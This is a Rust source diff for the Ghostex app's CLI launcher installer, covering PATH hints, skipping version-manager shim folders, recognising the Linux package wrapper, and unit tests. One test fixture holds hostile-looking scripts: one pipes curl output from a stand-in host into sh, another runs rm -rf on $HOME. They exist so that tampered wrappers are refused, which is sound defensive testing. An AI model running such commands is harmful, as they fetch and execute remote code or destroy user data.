@@ -67,9 +67,14 @@ pub(crate) fn gpui_finish_desktop_control_setup(
                 "Fast Computer & Browser Use is up to date. Ghostex Computer Use is ready.{skill_note}"
             )
         } else {
-            format!(
-                "Fast Computer & Browser Use installed. Grant accessibility and screen recording permissions if needed.{skill_note}"
-            )
+            // Accessibility and Screen Recording are macOS grants; Windows and X11 ask nothing.
+            if cfg!(target_os = "macos") {
+                format!(
+                    "Fast Computer & Browser Use installed. Grant accessibility and screen recording permissions if needed.{skill_note}"
+                )
+            } else {
+                format!("Fast Computer & Browser Use installed.{skill_note}")
+            }
         }),
         Err(message) => Err(format!(
             "Fast Computer & Browser Use {}, but Ghostex Computer Use skill could not be installed. {message}",
@@ -112,19 +117,89 @@ pub(crate) fn gpui_repair_ghostex_cli_commands() -> Result<String, String> {
 
     let gx_result =
         gpui_install_ghostex_cli_command("gx", &cli_binary_path, &cli_dir, &install_dirs);
+    let path_hint = gpui_cli_user_bin_path_hint(
+        &gpui_home_dir().join(".local/bin"),
+        &path_entries,
+        &gpui_home_dir(),
+    )
+    .map(|hint| format!(" {hint}"))
+    .unwrap_or_default();
     match gx_result {
         GpuiCliCommandInstallResult::Blocked { existing_path } => Ok(format!(
-            "Ghostex CLI linked. The gx alias was not changed because another command already owns that name at {}.",
+            "Ghostex CLI linked. The gx alias was not changed because another command already owns that name at {}.{path_hint}",
             gpui_path_string(&existing_path)
         )),
-        GpuiCliCommandInstallResult::Unavailable => Ok(
-            "Ghostex CLI linked. The gx alias could not be linked because no writable install location was available."
-                .to_string(),
+        GpuiCliCommandInstallResult::Unavailable => Ok(format!(
+            "Ghostex CLI linked. The gx alias could not be linked because no writable install location was available.{path_hint}"
+        )),
+        GpuiCliCommandInstallResult::Current | GpuiCliCommandInstallResult::Repaired => {
+            Ok(format!(
+                "Ghostex CLI linked. ghostex and gx now launch this GPUI app build where available.{path_hint}"
+            ))
+        }
+    }
+}
+
+/// CDXC:Cli 2026-10-28 WHY:
+/// On Linux (and a Mac without Homebrew's folders) the only writable place for the `ghostex` and
+/// `gx` launchers is ~/.local/bin, which minimal installs leave off PATH, so the link "worked" while
+/// a terminal outside Ghostex still answered "command not found". When the launchers are there and
+/// the folder is not on PATH, the link's result says so and gives the line to add. Windows keeps
+/// its own PATH handling.
+pub(crate) fn gpui_cli_user_bin_path_hint(
+    user_bin: &Path,
+    path_entries: &[PathBuf],
+    home: &Path,
+) -> Option<String> {
+    if cfg!(windows) || path_entries.iter().any(|entry| entry == user_bin) {
+        return None;
+    }
+    let launcher = user_bin.join(gpui_cli_wrapper_name("ghostex"));
+    if !gpui_path_exists_or_is_symlink(&launcher) {
+        return None;
+    }
+    let shown = user_bin
+        .strip_prefix(home)
+        .map(|rest| format!("~/{}", rest.to_string_lossy()))
+        .unwrap_or_else(|_| gpui_path_string(user_bin));
+    Some(format!(
+        "{shown} is not on your PATH, so terminals outside Ghostex will not find ghostex or gx. {}",
+        gpui_cli_path_fix(std::env::var("SHELL").ok().as_deref()).instruction()
+    ))
+}
+
+/// The line that puts ~/.local/bin on PATH for the user's shell, and where it goes.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub(crate) struct GpuiCliPathFix {
+    pub(crate) command: String,
+    /// Where it goes, in words: a shell file, or "run it once" for fish.
+    pub(crate) place: String,
+}
+
+impl GpuiCliPathFix {
+    pub(crate) fn instruction(&self) -> String {
+        format!("{}, then open a new terminal: {}", self.place, self.command)
+    }
+}
+
+/// `shell` is `$SHELL`; its file name picks the profile the user's terminals read.
+pub(crate) fn gpui_cli_path_fix(shell: Option<&str>) -> GpuiCliPathFix {
+    let name = shell
+        .map(|shell| shell.rsplit('/').next().unwrap_or(shell).trim())
+        .unwrap_or_default();
+    let export = "export PATH=\"$HOME/.local/bin:$PATH\"".to_string();
+    let (command, place) = match name {
+        "fish" => (
+            "fish_add_path $HOME/.local/bin".to_string(),
+            "Run this once in fish (it keeps the folder for new terminals)",
         ),
-        GpuiCliCommandInstallResult::Current | GpuiCliCommandInstallResult::Repaired => Ok(
-            "Ghostex CLI linked. ghostex and gx now launch this GPUI app build where available."
-                .to_string(),
-        ),
+        "zsh" => (export, "Add this line to ~/.zshrc"),
+        "bash" => (export, "Add this line to ~/.bashrc"),
+        _ => (export, "Add this line to ~/.profile"),
+    };
+    GpuiCliPathFix {
+        command,
+        place: place.to_string(),
     }
 }
 
@@ -163,6 +238,14 @@ pub(crate) fn gpui_auto_install_ghostex_cli_wrappers() {
         let mut command_exists = false;
         for candidate in gpui_cli_command_path_candidates(command, &path_entries, &common_dirs) {
             if !gpui_path_exists_or_is_symlink(&candidate) {
+                continue;
+            }
+            // A wrapper an earlier Ghostex left in a shim or tool folder does not count: that
+            // tool rewrites the folder, so the repair below writes a lasting one elsewhere.
+            if candidate
+                .parent()
+                .is_some_and(|dir| gpui_is_tool_managed_bin_dir(dir, &gpui_home_dir()))
+            {
                 continue;
             }
             command_exists = true;
@@ -405,6 +488,79 @@ pub(crate) fn gpui_cli_install_dirs(
     common_dirs: &[PathBuf],
     cli_dir: &Path,
 ) -> Vec<PathBuf> {
+    gpui_cli_install_dirs_for(
+        path_entries,
+        common_dirs,
+        cli_dir,
+        &gpui_home_dir(),
+        cfg!(target_os = "linux"),
+    )
+}
+
+/// Folders another tool owns and rewrites: version-manager shims (mise, asdf, pyenv, rbenv,
+/// nodenv, …), Nix profiles, Linux Homebrew, Snap, and the bin folders of `~/.cargo`, `~/.bun`,
+/// Volta, fnm, nvm and Deno, plus Ghostex's own per-session folder.
+///
+/// CDXC:Cli 2026-10-28 WHY:
+/// The launchers went into the first writable folder on PATH, which on a Linux desktop with mise
+/// was `~/.local/share/mise/shims`. mise rewrites that folder on its next reshim, so `ghostex` and
+/// `gx` vanished while the startup refresh kept writing them back. The launchers never go into
+/// such a folder, and one left there by an earlier Ghostex no longer counts as installed.
+pub(crate) fn gpui_is_tool_managed_bin_dir(dir: &Path, home: &Path) -> bool {
+    if dir
+        .components()
+        .any(|component| component.as_os_str() == "shims")
+    {
+        return true;
+    }
+    const HOME_TOOL_ROOTS: [&str; 20] = [
+        ".local/share/mise",
+        ".local/state/mise",
+        ".asdf",
+        ".pyenv",
+        ".rbenv",
+        ".nodenv",
+        ".goenv",
+        ".jenv",
+        ".cargo",
+        ".rustup",
+        ".bun",
+        ".volta",
+        ".nvm",
+        ".fnm",
+        ".local/share/fnm",
+        ".deno",
+        ".nix-profile",
+        ".local/state/nix",
+        ".linuxbrew",
+        ".local/state/ghostex/session-bin",
+    ];
+    if HOME_TOOL_ROOTS
+        .iter()
+        .any(|root| dir.starts_with(home.join(root)))
+    {
+        return true;
+    }
+    const SYSTEM_TOOL_ROOTS: [&str; 5] = [
+        "/nix",
+        "/run/current-system",
+        "/etc/profiles/per-user",
+        "/home/linuxbrew",
+        "/snap",
+    ];
+    SYSTEM_TOOL_ROOTS.iter().any(|root| dir.starts_with(root))
+}
+
+/// Where `ghostex` and `gx` may be written, best first: folders that already hold Ghostex's own
+/// command (a package's `/usr/bin` script, an earlier wrapper), then on Linux `~/.local/bin`
+/// (created when missing), then the rest of PATH and the common folders, never a tool-managed one.
+pub(crate) fn gpui_cli_install_dirs_for(
+    path_entries: &[PathBuf],
+    common_dirs: &[PathBuf],
+    cli_dir: &Path,
+    home: &Path,
+    prefer_user_bin: bool,
+) -> Vec<PathBuf> {
     let mut owned_dirs = Vec::new();
     for command in ["ghostex", "gx"] {
         for candidate in gpui_cli_command_path_candidates(command, path_entries, common_dirs) {
@@ -423,12 +579,17 @@ pub(crate) fn gpui_cli_install_dirs(
             .filter(|directory| path_entries.contains(directory))
             .cloned(),
     );
+    let user_bin = prefer_user_bin.then(|| home.join(".local/bin"));
     gpui_unique_paths(
         owned_dirs
             .into_iter()
+            .chain(user_bin)
             .chain(path_entries.iter().cloned())
             .chain(common_dirs.iter().cloned()),
     )
+    .into_iter()
+    .filter(|directory| !gpui_is_tool_managed_bin_dir(directory, home))
+    .collect()
 }
 
 pub(crate) fn gpui_cli_command_path_candidates(
@@ -520,7 +681,9 @@ pub(crate) fn gpui_is_ghostex_owned_command_path(
         return true;
     }
     let realpath = gpui_realpath_or_self(path);
-    if gpui_realpath_is_bundle_cli(&realpath, cli_dir) {
+    if gpui_realpath_is_bundle_cli(&realpath, cli_dir)
+        || gpui_is_linux_package_cli_wrapper_file(&realpath)
+    {
         return true;
     }
     gpui_is_ghostex_app_owned_command_realpath(command, &realpath)
@@ -543,6 +706,8 @@ pub(crate) enum GpuiCliEntryState {
     },
     /// A wrapper file Ghostex wrote (it carries the CliInstall marker).
     MarkedWrapper,
+    /// The `/usr/bin/ghostex` script a Linux package installed.
+    LinuxPackageWrapper,
     OtherFile,
 }
 
@@ -564,18 +729,21 @@ pub(crate) fn gpui_package_managed_cli_decision(
     state: &GpuiCliEntryState,
     cask_link_target: Option<&Path>,
 ) -> GpuiPackageManagedCli {
-    if let GpuiCliEntryState::Symlink {
-        resolved: Some(resolved),
-    } = state
-        && gpui_is_package_cli_link_target(command, resolved)
-    {
-        return GpuiPackageManagedCli::Keep;
+    match state {
+        GpuiCliEntryState::LinuxPackageWrapper => return GpuiPackageManagedCli::Keep,
+        GpuiCliEntryState::Symlink {
+            resolved: Some(resolved),
+        } if gpui_is_package_cli_link_target(command, resolved) => {
+            return GpuiPackageManagedCli::Keep;
+        }
+        _ => {}
     }
     let Some(target) = cask_link_target else {
         return GpuiPackageManagedCli::NotManaged;
     };
     match state {
-        GpuiCliEntryState::Symlink { resolved: Some(_) } => GpuiPackageManagedCli::Keep,
+        GpuiCliEntryState::Symlink { resolved: Some(_) }
+        | GpuiCliEntryState::LinuxPackageWrapper => GpuiPackageManagedCli::Keep,
         GpuiCliEntryState::Missing
         | GpuiCliEntryState::Symlink { resolved: None }
         | GpuiCliEntryState::MarkedWrapper => GpuiPackageManagedCli::Relink {
@@ -587,14 +755,16 @@ pub(crate) fn gpui_package_managed_cli_decision(
 }
 
 /// A link target only a package manager installing Ghostex creates: the CLI
-/// inside any Ghostex.app (`CLI/gx` is itself a link to `CLI/ghostex`), or a
-/// Homebrew cask wrapper for this command.
+/// inside any Ghostex.app (`CLI/gx` is itself a link to `CLI/ghostex`), a
+/// Homebrew cask wrapper for this command, or the Linux package's
+/// `/usr/bin/ghostex` script (its `/usr/bin/gx` links there).
 pub(crate) fn gpui_is_package_cli_link_target(command: &str, resolved: &Path) -> bool {
     let normalized = gpui_path_string(resolved).replace('\\', "/").to_lowercase();
     normalized.ends_with("/ghostex.app/contents/resources/cli/ghostex")
         || gpui_is_merged_bundle_cli_realpath(&normalized)
         || (normalized.contains("/caskroom/ghostex/")
             && normalized.ends_with(&format!("/.homebrew-command-wrappers/{command}")))
+        || gpui_is_linux_package_cli_wrapper_file(resolved)
 }
 
 pub(crate) fn gpui_package_managed_cli(
@@ -618,6 +788,8 @@ pub(crate) fn gpui_cli_entry_state(path: &Path) -> GpuiCliEntryState {
     }
     if gpui_is_marked_ghostex_wrapper_file(path) {
         GpuiCliEntryState::MarkedWrapper
+    } else if gpui_is_linux_package_cli_wrapper_file(path) {
+        GpuiCliEntryState::LinuxPackageWrapper
     } else {
         GpuiCliEntryState::OtherFile
     }
@@ -739,8 +911,35 @@ pub(crate) fn gpui_is_ghostex_app_owned_command_realpath(command: &str, realpath
 
 /// CDXC:Cli 2026-10-23 WHY:
 /// macOS and Linux ship `ghostex` as a link to gxserver (CDXC:Release 2026-10-23 in server/src/main.rs), so a PATH entry linking to a bundle's `CLI/ghostex`, the Homebrew cask's included, now resolves to `Contents/Resources/Web/gxserver/bin/gxserver`. Every realpath ownership check accepts that file as the CLI; otherwise startup would treat the cask's link as someone else's command, the failure behind GitHub issue #203. `normalized` is the lowercased path with `/` separators.
+/// Since 2026-11-04 that file is the main executable of the package's GhostexServer.app (CDXC:RemotePairing in apps/desktop/scripts/package-macos-gxserver-bundles.sh), behind the package's `bin/gxserver` link.
 fn gpui_is_merged_bundle_cli_realpath(normalized: &str) -> bool {
     normalized.ends_with("/ghostex.app/contents/resources/web/gxserver/bin/gxserver")
+        || normalized.ends_with(
+            "/ghostex.app/contents/resources/web/gxserver/ghostexserver.app/contents/macos/gxserver",
+        )
+}
+
+/// The `/usr/bin/ghostex` script every Linux package ships, byte for byte as
+/// `tooling/release-gpui/linux-stage.sh` writes it.
+pub(crate) const GPUI_LINUX_PACKAGE_CLI_WRAPPER: &str =
+    "#!/usr/bin/env bash\nexec /opt/ghostex/gxserver/bin/ghostex \"$@\"\n";
+
+/// CDXC:Cli 2026-10-26 WHY:
+/// The deb, rpm and tarball, and the AUR `ghostex-bin` package that installs the tarball verbatim, put `ghostex` on PATH as `/usr/bin/ghostex`, an unmarked two-line script that execs `/opt/ghostex/gxserver/bin/ghostex`, with `/usr/bin/gx` linking to it. The ownership checks only knew Ghostex's own marked wrappers and app-bundle realpaths, so every skill install refused that script with "could not prove it belongs to Ghostex": the first-run wizard's Computer Use and browser skill steps always failed on Arch, and Settings worked only after Link CLI wrote a marked wrapper into a ~/.local/bin that comes earlier on PATH (GitHub issue #311). Only the exact packaged script counts, so an unrelated `ghostex` stays refused, and the package manager owns it, so it is kept like a Homebrew cask link and never rewritten.
+/// SEE-ALSO: the `usr/bin/ghostex` heredoc in tooling/release-gpui/linux-stage.sh.
+pub(crate) fn gpui_is_linux_package_cli_wrapper_file(path: &Path) -> bool {
+    if !gpui_is_regular_file(path) {
+        return false;
+    }
+    let Ok(metadata) = fs::symlink_metadata(path) else {
+        return false;
+    };
+    if metadata.len() > 4 * 1024 {
+        return false;
+    }
+    fs::read_to_string(path)
+        .map(|content| content.trim_end() == GPUI_LINUX_PACKAGE_CLI_WRAPPER.trim_end())
+        .unwrap_or(false)
 }
 
 pub(crate) fn gpui_is_marked_ghostex_wrapper_file(path: &Path) -> bool {
@@ -894,5 +1093,296 @@ pub(crate) fn gpui_install_bundled_ghostex_skill(
         Err(_) => Err(format!(
             "{display_name} install could not be started. Current integration status was refreshed."
         )),
+    }
+}
+
+#[cfg(all(test, unix))]
+mod linux_package_cli_tests {
+    use super::*;
+
+    fn scratch_dir(name: &str) -> PathBuf {
+        let dir = env::temp_dir().join(format!(
+            "ghostex-cli-ownership-{name}-{}-{}",
+            std::process::id(),
+            system_time_epoch_millis_string(SystemTime::now())
+        ));
+        let _ = fs::remove_dir_all(&dir);
+        fs::create_dir_all(dir.join("usr/bin")).unwrap();
+        fs::create_dir_all(dir.join("home/.local/bin")).unwrap();
+        fs::create_dir_all(dir.join("opt/ghostex/gxserver/bin")).unwrap();
+        dir
+    }
+
+    fn write_executable(path: &Path, content: &str) {
+        fs::write(path, content).unwrap();
+        fs::set_permissions(path, fs::Permissions::from_mode(0o755)).unwrap();
+    }
+
+    #[test]
+    fn tool_managed_folders_are_never_install_targets() {
+        let home = PathBuf::from("/home/me");
+        for managed in [
+            "/home/me/.local/share/mise/shims",
+            "/home/me/.asdf/shims",
+            "/home/me/.pyenv/shims",
+            "/home/me/.rbenv/shims",
+            "/home/me/.nodenv/shims",
+            "/home/me/.cargo/bin",
+            "/home/me/.bun/bin",
+            "/home/me/.volta/bin",
+            "/home/me/.nix-profile/bin",
+            "/nix/var/nix/profiles/default/bin",
+            "/run/current-system/sw/bin",
+            "/home/linuxbrew/.linuxbrew/bin",
+            "/home/me/.linuxbrew/bin",
+            "/snap/bin",
+            "/home/me/.local/state/ghostex/session-bin",
+        ] {
+            assert!(
+                gpui_is_tool_managed_bin_dir(Path::new(managed), &home),
+                "{managed}"
+            );
+        }
+        for plain in [
+            "/home/me/.local/bin",
+            "/usr/local/bin",
+            "/usr/bin",
+            "/opt/homebrew/bin",
+            "/home/me/bin",
+        ] {
+            assert!(
+                !gpui_is_tool_managed_bin_dir(Path::new(plain), &home),
+                "{plain}"
+            );
+        }
+    }
+
+    #[test]
+    fn linux_prefers_local_bin_and_skips_tool_folders() {
+        let root = scratch_dir("install-order");
+        let home = root.join("home");
+        let mise = home.join(".local/share/mise/shims");
+        let cargo = home.join(".cargo/bin");
+        let usr_local = root.join("usr/local/bin");
+        let user_bin = home.join(".local/bin");
+        let cli_dir = root.join("opt/ghostex/gxserver/bin");
+        let path_entries = vec![mise.clone(), cargo.clone(), usr_local.clone()];
+        let position = |dirs: &[PathBuf], dir: &Path| dirs.iter().position(|entry| entry == dir);
+
+        let linux = gpui_cli_install_dirs_for(&path_entries, &[], &cli_dir, &home, true);
+        assert_eq!(position(&linux, &mise), None);
+        assert_eq!(position(&linux, &cargo), None);
+        assert!(
+            position(&linux, &user_bin).unwrap() < position(&linux, &usr_local).unwrap(),
+            "{linux:?}"
+        );
+
+        // macOS keeps PATH order (Homebrew's bin first) and only drops tool folders.
+        let mac =
+            gpui_cli_install_dirs_for(&path_entries, &[user_bin.clone()], &cli_dir, &home, false);
+        assert_eq!(position(&mac, &mise), None);
+        assert!(position(&mac, &usr_local).unwrap() < position(&mac, &user_bin).unwrap());
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn the_path_fix_matches_the_users_shell() {
+        let export = "export PATH=\"$HOME/.local/bin:$PATH\"";
+        let zsh = gpui_cli_path_fix(Some("/usr/bin/zsh"));
+        assert_eq!(
+            (zsh.command.as_str(), zsh.place.as_str()),
+            (export, "Add this line to ~/.zshrc")
+        );
+        let bash = gpui_cli_path_fix(Some("/bin/bash"));
+        assert_eq!(bash.place, "Add this line to ~/.bashrc");
+        let fish = gpui_cli_path_fix(Some("/usr/bin/fish"));
+        assert_eq!(fish.command, "fish_add_path $HOME/.local/bin");
+        for unknown in [None, Some("/bin/dash"), Some("")] {
+            let fix = gpui_cli_path_fix(unknown);
+            assert_eq!(
+                (fix.command.as_str(), fix.place.as_str()),
+                (export, "Add this line to ~/.profile")
+            );
+        }
+    }
+
+    #[test]
+    fn local_bin_launcher_off_path_gets_a_path_hint() {
+        let root = scratch_dir("path-hint");
+        let home = root.join("home");
+        let user_bin = home.join(".local/bin");
+        assert_eq!(
+            gpui_cli_user_bin_path_hint(&user_bin, &[root.join("usr/bin")], &home),
+            None,
+            "no launcher in ~/.local/bin, nothing to say"
+        );
+        write_executable(&user_bin.join("ghostex"), "#!/bin/sh\n");
+        let hint = gpui_cli_user_bin_path_hint(&user_bin, &[root.join("usr/bin")], &home)
+            .expect("off PATH");
+        assert!(
+            hint.starts_with("~/.local/bin is not on your PATH"),
+            "{hint}"
+        );
+        assert!(hint.contains("$HOME/.local/bin"), "{hint}");
+        assert_eq!(
+            gpui_cli_user_bin_path_hint(&user_bin, &[user_bin.clone()], &home),
+            None,
+            "on PATH already"
+        );
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    /// The AUR `ghostex-bin` layout: the tarball's /usr/bin/ghostex script and its gx link.
+    fn aur_layout(name: &str) -> (PathBuf, PathBuf, PathBuf) {
+        let root = scratch_dir(name);
+        let cli_dir = root.join("opt/ghostex/gxserver/bin");
+        write_executable(&cli_dir.join("ghostex"), "#!/bin/sh\n");
+        let ghostex = root.join("usr/bin/ghostex");
+        write_executable(&ghostex, GPUI_LINUX_PACKAGE_CLI_WRAPPER);
+        std::os::unix::fs::symlink("ghostex", root.join("usr/bin/gx")).unwrap();
+        (root, cli_dir, ghostex)
+    }
+
+    #[test]
+    fn aur_usr_bin_script_and_gx_link_belong_to_ghostex() {
+        let (root, cli_dir, ghostex) = aur_layout("aur");
+        let gx = root.join("usr/bin/gx");
+        let cli_binary = cli_dir.join("ghostex");
+
+        assert!(gpui_is_probably_ghostex_command(&ghostex, "ghostex"));
+        assert!(gpui_is_probably_ghostex_command(&gx, "gx"));
+        assert!(gpui_is_ghostex_owned_command_path(
+            "ghostex", &ghostex, &cli_dir
+        ));
+        assert!(gpui_is_ghostex_owned_command_path("gx", &gx, &cli_dir));
+        assert_eq!(
+            gpui_cli_entry_state(&ghostex),
+            GpuiCliEntryState::LinuxPackageWrapper
+        );
+        assert_eq!(
+            gpui_package_managed_cli("ghostex", &ghostex, &cli_binary),
+            GpuiPackageManagedCli::Keep
+        );
+        assert_eq!(
+            gpui_package_managed_cli("gx", &gx, &cli_binary),
+            GpuiPackageManagedCli::Keep
+        );
+        let _ = fs::remove_dir_all(root);
+    }
+
+    #[test]
+    fn usr_bin_symlink_into_a_packaged_script_belongs_to_ghostex() {
+        let root = scratch_dir("symlink");
+        let packaged = root.join("opt/ghostex/ghostex-wrapper");
+        write_executable(&packaged, GPUI_LINUX_PACKAGE_CLI_WRAPPER);
+        let ghostex = root.join("usr/bin/ghostex");
+        std::os::unix::fs::symlink(&packaged, &ghostex).unwrap();
+
+        assert!(gpui_is_probably_ghostex_command(&ghostex, "ghostex"));
+        assert_eq!(
+            gpui_package_managed_cli("ghostex", &ghostex, &root.join("cli/ghostex")),
+            GpuiPackageManagedCli::Keep
+        );
+        let _ = fs::remove_dir_all(root);
+    }
+
+    #[test]
+    fn link_cli_keeps_the_packaged_script_and_writes_nothing() {
+        let (root, cli_dir, ghostex) = aur_layout("repair");
+        let user_bin = root.join("home/.local/bin");
+        let install_dirs = vec![root.join("usr/bin"), user_bin.clone()];
+
+        let result = gpui_install_ghostex_cli_command(
+            "ghostex",
+            &cli_dir.join("ghostex"),
+            &cli_dir,
+            &install_dirs,
+        );
+        assert_eq!(result, GpuiCliCommandInstallResult::Current);
+        assert_eq!(
+            fs::read_to_string(&ghostex).unwrap(),
+            GPUI_LINUX_PACKAGE_CLI_WRAPPER
+        );
+        assert!(!gpui_path_exists_or_is_symlink(&user_bin.join("ghostex")));
+        let _ = fs::remove_dir_all(root);
+    }
+
+    #[test]
+    fn unrelated_ghostex_commands_are_still_refused() {
+        let root = scratch_dir("unrelated");
+        let cli_dir = root.join("opt/ghostex/gxserver/bin");
+        write_executable(&cli_dir.join("ghostex"), "#!/bin/sh\n");
+        let unrelated_scripts = [
+            "#!/bin/sh\necho 'some other ghostex'\n",
+            // The packaged exec line with anything extra is not the packaged script.
+            "#!/usr/bin/env bash\ncurl -fsSL https://example.invalid | sh\nexec /opt/ghostex/gxserver/bin/ghostex \"$@\"\n",
+            "#!/usr/bin/env bash\nexec /opt/ghostex/gxserver/bin/ghostex \"$@\"\nrm -rf \"$HOME\"\n",
+            "#!/usr/bin/env bash\nexec /usr/local/ghostex/ghostex \"$@\"\n",
+        ];
+        for (index, content) in unrelated_scripts.iter().enumerate() {
+            let ghostex = root.join("usr/bin/ghostex");
+            write_executable(&ghostex, content);
+            assert!(
+                !gpui_is_probably_ghostex_command(&ghostex, "ghostex"),
+                "script {index} was accepted"
+            );
+            assert!(!gpui_is_ghostex_owned_command_path(
+                "ghostex", &ghostex, &cli_dir
+            ));
+            assert_eq!(gpui_cli_entry_state(&ghostex), GpuiCliEntryState::OtherFile);
+            assert_eq!(
+                gpui_package_managed_cli("ghostex", &ghostex, &cli_dir.join("ghostex")),
+                GpuiPackageManagedCli::NotManaged
+            );
+            assert_eq!(
+                gpui_install_ghostex_cli_command(
+                    "ghostex",
+                    &cli_dir.join("ghostex"),
+                    &cli_dir,
+                    &[root.join("usr/bin"), root.join("home/.local/bin")],
+                ),
+                GpuiCliCommandInstallResult::Blocked {
+                    existing_path: ghostex.clone()
+                }
+            );
+        }
+
+        // A symlink into someone else's file is refused too.
+        let other = root.join("opt/other-ghostex");
+        write_executable(&other, "#!/bin/sh\necho other\n");
+        let link = root.join("usr/bin/gx");
+        std::os::unix::fs::symlink(&other, &link).unwrap();
+        assert!(!gpui_is_probably_ghostex_command(&link, "gx"));
+        assert_eq!(
+            gpui_package_managed_cli("gx", &link, &cli_dir.join("ghostex")),
+            GpuiPackageManagedCli::NotManaged
+        );
+        let _ = fs::remove_dir_all(root);
+    }
+
+    /// A Homebrew cask link to `CLI/ghostex` resolves into the package's GhostexServer.app since
+    /// gxserver moved into it, and still counts as Ghostex's own CLI (GitHub #203).
+    #[test]
+    fn the_cli_resolved_into_the_gxserver_bundle_is_the_apps_own() {
+        let web = "/Applications/Ghostex.app/Contents/Resources/Web/gxserver";
+        for realpath in [
+            format!("{web}/bin/gxserver"),
+            format!("{web}/GhostexServer.app/Contents/MacOS/gxserver"),
+        ] {
+            assert!(gpui_is_package_cli_link_target(
+                "ghostex",
+                Path::new(&realpath)
+            ));
+            assert!(gpui_is_ghostex_app_owned_command_realpath(
+                "ghostex",
+                Path::new(&realpath)
+            ));
+        }
+        assert!(!gpui_is_package_cli_link_target(
+            "ghostex",
+            Path::new(
+                "/Applications/Other.app/Contents/Resources/Web/gxserver/GhostexServer.app/Contents/MacOS/gxserver"
+            )
+        ));
     }
 }
